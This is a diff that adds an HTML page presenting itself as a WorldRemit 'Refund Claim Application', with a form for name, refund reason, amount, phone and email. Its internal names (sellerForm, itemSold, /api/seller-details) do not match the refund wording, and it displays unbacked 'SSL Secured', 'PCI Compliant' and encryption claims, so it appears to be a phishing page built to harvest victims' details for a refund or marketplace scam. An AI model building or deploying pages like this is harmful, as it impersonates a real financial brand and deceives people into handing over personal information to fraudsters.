@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WorldRemit — Refund Claim</title>
+    <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,300;0,9..40,400;0,9..40,500;0,9..40,600;0,9..40,700;1,9..40,400&display=swap" rel="stylesheet">
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            /* WorldRemit Theme Variables */
+            --brand-primary: #0052CC;
+            --brand-dark: #003D99;
+            --brand-light: #E6F0FF;
+            --brand-ghost: #F0F6FF;
+            --brand-subtle: rgba(0, 82, 204, 0.08);
+            --text-primary: #1B1B1B;
+            --text-secondary: #6B7280;
+            --text-tertiary: #9CA3AF;
+            --border: #E5E7EB;
+            --border-focus: #0052CC;
+            --bg-body: #F9FAFB;
+            --bg-card: #FFFFFF;
+            --bg-input: #F9FAFB;
+            --bg-input-focus: #FFFFFF;
+            --shadow-sm: 0 1px 2px rgba(0,0,0,0.05);
+            --shadow-md: 0 4px 12px rgba(0,0,0,0.06);
+            --shadow-lg: 0 12px 40px rgba(0,0,0,0.08);
+            --shadow-btn: 0 4px 14px rgba(0, 82, 204, 0.3);
+            --radius-sm: 8px;
+            --radius-md: 12px;
+            --radius-lg: 16px;
+            --radius-xl: 20px;
+        }
+
+        body {
+            font-family: 'DM Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: var(--bg-body);
+            padding: 24px 16px;
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background:
+                radial-gradient(ellipse 80% 50% at 50% -20%, rgba(0,82,204,0.08) 0%, transparent 60%),
+                radial-gradient(ellipse 60% 40% at 80% 100%, rgba(0,82,204,0.04) 0%, transparent 50%);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .page-wrapper { position: relative; z-index: 1; width: 100%; max-width: 440px; }
+
+        /* Top Navigation Bar */
+        .top-bar { display: flex; align-items: center; justify-content: space-between; margin-bottom: 32px; padding: 0 4px; }
+        .logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .logo-mark {
+            width: 40px; height: 40px; background: var(--brand-primary);
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            position: relative; overflow: hidden; color: #fff;
+        }
+        .logo-wordmark { font-size: 22px; font-weight: 700; color: var(--text-primary); letter-spacing: -0.5px; }
+        .help-link { font-size: 13px; font-weight: 500; color: var(--brand-primary); text-decoration: none; display: flex; align-items: center; gap: 4px; padding: 6px 12px; border-radius: var(--radius-sm); transition: background 0.2s; }
+        .help-link:hover { background: var(--brand-light); }
+        .help-link svg { width: 16px; height: 16px; }
+
+        /* Card */
+        .card { background: var(--bg-card); border-radius: var(--radius-xl); box-shadow: var(--shadow-lg); border: 1px solid rgba(0,0,0,0.04); overflow: hidden; }
+        .card-header { padding: 32px 32px 0; }
+        .card-header h2 { font-size: 20px; font-weight: 600; color: var(--text-primary); margin-bottom: 6px; letter-spacing: -0.3px; }
+        .card-header p { font-size: 14px; color: var(--text-secondary); line-height: 1.5; }
+
+        /* Info Banner */
+        .info-banner {
+            margin: 20px 32px; background: var(--brand-ghost);
+            border: 1px solid rgba(0, 82, 204, 0.15); border-radius: var(--radius-md);
+            padding: 12px 16px; display: flex; align-items: flex-start; gap: 10px;
+        }
+        .info-banner svg { width: 18px; height: 18px; color: var(--brand-primary); flex-shrink: 0; margin-top: 1px; }
+        .info-banner span { font-size: 13px; color: #003D99; line-height: 1.5; }
+
+        /* Form */
+        .form-body { padding: 4px 32px 32px; }
+        .input-group { margin-bottom: 18px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 500; color: var(--text-primary); margin-bottom: 7px; }
+        .input-wrap { position: relative; }
+        .input-wrap .field-icon {
+            position: absolute; left: 14px; top: 50%; transform: translateY(-50%);
+            width: 18px; height: 18px; color: var(--text-tertiary); pointer-events: none; transition: color 0.2s;
+        }
+        .input-group input {
+            width: 100%; padding: 13px 14px 13px 42px; border: 1.5px solid var(--border);
+            border-radius: var(--radius-md); font-size: 14px; font-family: inherit;
+            color: var(--text-primary); background: var(--bg-input); transition: all 0.2s ease; outline: none;
+        }
+        .input-group input::placeholder { color: var(--text-tertiary); }
+        .input-group input:focus {
+            border-color: var(--border-focus); background: var(--bg-input-focus);
+            box-shadow: 0 0 0 3px rgba(0, 82, 204, 0.1);
+        }
+        .input-group input:focus ~ .field-icon { color: var(--brand-primary); }
+
+        /* Amount input special styling */
+        .input-wrap .currency-badge {
+            position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+            background: var(--brand-light); color: var(--brand-dark); font-size: 12px; font-weight: 600;
+            padding: 3px 8px; border-radius: 6px; pointer-events: none;
+        }
+        .amount-input { padding-right: 64px !important; }
+
+        /* Buttons */
+        .btn-primary {
+            width: 100%; padding: 14px 24px; background: var(--brand-primary); color: #fff;
+            border: none; border-radius: var(--radius-md); font-size: 15px; font-weight: 600;
+            font-family: inherit; cursor: pointer; transition: all 0.25s ease; display: flex;
+            align-items: center; justify-content: center; gap: 8px; margin-top: 24px; position: relative; overflow: hidden;
+        }
+        .btn-primary::before {
+            content: ''; position: absolute; inset: 0;
+            background: linear-gradient(180deg, rgba(255,255,255,0.12) 0%, transparent 100%);
+            pointer-events: none;
+        }
+        .btn-primary:hover { background: var(--brand-dark); box-shadow: var(--shadow-btn); transform: translateY(-1px); }
+        .btn-primary:active { transform: translateY(0); box-shadow: 0 2px 8px rgba(0, 82, 204, 0.2); }
+        .btn-primary:disabled { opacity: 0.65; cursor: not-allowed; transform: none; box-shadow: none; }
+        .btn-primary .btn-arrow { width: 16px; height: 16px; transition: transform 0.2s; }
+        .btn-primary:hover .btn-arrow { transform: translateX(2px); }
+
+        .spinner { width: 18px; height: 18px; border: 2.5px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.7s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .error-msg { color: #DC2626; font-size: 13px; text-align: center; margin-top: 14px; display: none; padding: 8px 12px; background: #FEF2F2; border-radius: var(--radius-sm); border: 1px solid #FECACA; }
+
+        /* Divider */
+        .divider { display: flex; align-items: center; gap: 12px; margin-top: 20px; margin-bottom: 16px; }
+        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: var(--border); }
+        .divider span { font-size: 12px; color: var(--text-tertiary); white-space: nowrap; }
+
+        /* Secondary button */
+        .btn-secondary {
+            width: 100%; padding: 13px 24px; background: transparent; color: var(--text-primary);
+            border: 1.5px solid var(--border); border-radius: var(--radius-md); font-size: 14px;
+            font-weight: 500; font-family: inherit; cursor: pointer; transition: all 0.2s ease;
+            display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+        .btn-secondary:hover { border-color: #D1D5DB; background: var(--bg-body); }
+        .btn-secondary svg { width: 16px; height: 16px; color: var(--text-secondary); }
+
+        /* Footer */
+        .card-footer { padding: 0 32px 28px; }
+        .footer-text { text-align: center; font-size: 12px; color: var(--text-tertiary); line-height: 1.7; }
+        .footer-text a { color: var(--brand-primary); text-decoration: none; font-weight: 500; transition: color 0.2s; }
+        .footer-text a:hover { color: var(--brand-dark); text-decoration: underline; }
+
+        .security-row { display: flex; align-items: center; justify-content: center; gap: 16px; margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--border); }
+        .security-badge { display: flex; align-items: center; gap: 5px; font-size: 11px; color: var(--text-tertiary); }
+        .security-badge svg { width: 14px; height: 14px; color: var(--brand-primary); }
+
+        .toast { position: fixed; top: 24px; left: 50%; transform: translateX(-50%) translateY(-120%); background: var(--text-primary); color: #fff; padding: 12px 20px; border-radius: var(--radius-md); font-size: 14px; font-family: inherit; box-shadow: 0 8px 30px rgba(0,0,0,0.15); z-index: 9999; transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+        .toast.error { background: #DC2626; }
+        .toast.success { background: var(--brand-primary); }
+
+        @media (max-width: 480px) { body { padding: 16px 12px; } .card-header { padding: 24px 24px 0; } .form-body { padding: 4px 24px 24px; } .card-footer { padding: 0 24px 24px; } .info-banner { margin: 16px 24px; } .card-header h2 { font-size: 18px; } }
+
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-in { animation: fadeUp 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+        .delay-1 { animation-delay: 0.05s; } .delay-2 { animation-delay: 0.1s; } .delay-3 { animation-delay: 0.15s; } .delay-4 { animation-delay: 0.2s; } .delay-5 { animation-delay: 0.25s; } .delay-6 { animation-delay: 0.3s; } .delay-7 { animation-delay: 0.35s; } .delay-8 { animation-delay: 0.4s; } .delay-9 { animation-delay: 0.45s; }
+    </style>
+</head>
+<body>
+    <div class="toast" id="toast"></div>
+    <div class="page-wrapper">
+        <div class="top-bar animate-in">
+            <a href="#" class="logo">
+                <div class="logo-mark">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" width="24" height="24">
+                        <circle cx="12" cy="12" r="10" />
+                        <line x1="2" y1="12" x2="22" y2="12" />
+                        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z" />
+                    </svg>
+                </div>
+                <span class="logo-wordmark">WorldRemit</span>
+            </a>
+            <a href="#" class="help-link">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                Help
+            </a>
+        </div>
+
+        <div class="card">
+            <div class="card-header animate-in delay-1">
+                <h2>Refund Claim Application</h2>
+                <p>Fill in your information to process your compensation securely.</p>
+            </div>
+
+            <div class="info-banner animate-in delay-2">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                <span>Your details are encrypted and protected end-to-end.</span>
+            </div>
+
+            <form id="sellerForm" autocomplete="off" class="form-body">
+                <input type="text" name="fake-name" style="display:none" aria-hidden="true" tabindex="-1">
+                <input type="email" name="fake-email" style="display:none" aria-hidden="true" tabindex="-1">
+
+                <div class="input-group animate-in delay-3">
+                    <label for="fullName">Full name</label>
+                    <div class="input-wrap">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+                        <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                    </div>
+                </div>
+
+                <div class="input-group animate-in delay-4">
+                    <label for="itemSold">Reason for refund</label>
+                    <div class="input-wrap">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                        <input type="text" id="itemSold" name="itemSold" placeholder="e.g. Service not received, Overcharge" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                    </div>
+                </div>
+
+                <div class="input-group animate-in delay-5">
+                    <label for="amount">Refund amount</label>
+                    <div class="input-wrap">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="1" x2="12" y2="23"/><path d="M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg>
+                        <input type="text" id="amount" name="amount" class="amount-input" placeholder="0.00" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')" inputmode="decimal">
+                        <span class="currency-badge">USD</span>
+                    </div>
+                </div>
+
+                <div class="input-group animate-in delay-6">
+                    <label for="sellerPhone">Phone number</label>
+                    <div class="input-wrap">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
+                        <input type="tel" id="sellerPhone" name="sellerPhone" placeholder="+1 555-123-4567" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                    </div>
+                </div>
+
+                <div class="input-group animate-in delay-7">
+                    <label for="buyerEmail">Contact email address</label>
+                    <div class="input-wrap">
+                        <svg class="field-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
+                        <input type="email" id="buyerEmail" name="buyerEmail" placeholder="you@example.com" required autocomplete="off" readonly onfocus="this.removeAttribute('readonly')">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn-primary animate-in delay-8" id="submitBtn">
+                    <span>Continue</span>
+                    <svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
+                </button>
+
+                <div id="errorMsg" class="error-msg"></div>
+
+                <div class="divider animate-in delay-9">
+                    <span>or</span>
+                </div>
+
+                <button type="button" class="btn-secondary animate-in delay-9" id="scanBtn">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg>
+                    Scan QR code instead
+                </button>
+            </form>
+
+            <div class="card-footer animate-in delay-9">
+                <p class="footer-text">
+                    By continuing, you agree to WorldRemit's
+                    <a href="#">Terms of Service</a> and
+                    <a href="#">Privacy Policy</a>.
+                </p>
+
+                <div class="security-row">
+                    <div class="security-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                        SSL Secured
+                    </div>
+                    <div class="security-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                        PCI Compliant
+                    </div>
+                    <div class="security-badge">
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+                        Verified
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showToast(message, type = 'error') {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + type;
+            requestAnimationFrame(() => { toast.classList.add('show'); });
+            setTimeout(() => { toast.classList.remove('show'); }, 3500);
+        }
+
+        const amountInput = document.getElementById('amount');
+        amountInput.addEventListener('input', function() {
+            let val = this.value.replace(/[^0-9.]/g, '');
+            const parts = val.split('.');
+            if (parts.length > 2) val = parts[0] + '.' + parts.slice(1).join('');
+            if (parts[1] && parts[1].length > 2) val = parts[0] + '.' + parts[1].substring(0, 2);
+            this.value = val;
+        });
+
+        document.getElementById('sellerForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('submitBtn');
+            const errorMsg = document.getElementById('errorMsg');
+
+            const fullName = document.getElementById('fullName').value.trim();
+            const itemSold = document.getElementById('itemSold').value.trim();
+            const amount = document.getElementById('amount').value.trim();
+            const sellerPhone = document.getElementById('sellerPhone').value.trim();
+            const buyerEmail = document.getElementById('buyerEmail').value.trim();
+
+            errorMsg.style.display = 'none';
+
+            if (!fullName || !itemSold || !amount || !sellerPhone || !buyerEmail) {
+                errorMsg.textContent = 'Please fill in all fields to continue.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            if (isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
+                errorMsg.textContent = 'Please enter a valid amount greater than zero.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(buyerEmail)) {
+                errorMsg.textContent = 'Please enter a valid email address.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div><span>Processing...</span>';
+
+            try {
+                const res = await fetch('/api/seller-details', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ fullName, itemSold, amount, sellerPhone, buyerEmail })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    localStorage.setItem('sellerName', fullName);
+                    localStorage.setItem('sellerAmount', amount);
+                    showToast('Details submitted successfully!', 'success');
+                    setTimeout(() => { window.location.href = data.redirect; }, 600);
+                } else {
+                    errorMsg.textContent = data.message || 'Submission failed. Please try again.';
+                    errorMsg.style.display = 'block';
+                }
+            } catch (err) {
+                showToast('Connection error. Please check your network.', 'error');
+                errorMsg.textContent = 'Unable to connect. Please try again.';
+                errorMsg.style.display = 'block';
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<span>Continue</span><svg class="btn-arrow" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
+            }
+        });
+
+        document.getElementById('scanBtn').addEventListener('click', function() {
+            showToast('QR scanner coming soon.', 'error');
+        });
+    </script>
+</body>
+</html>
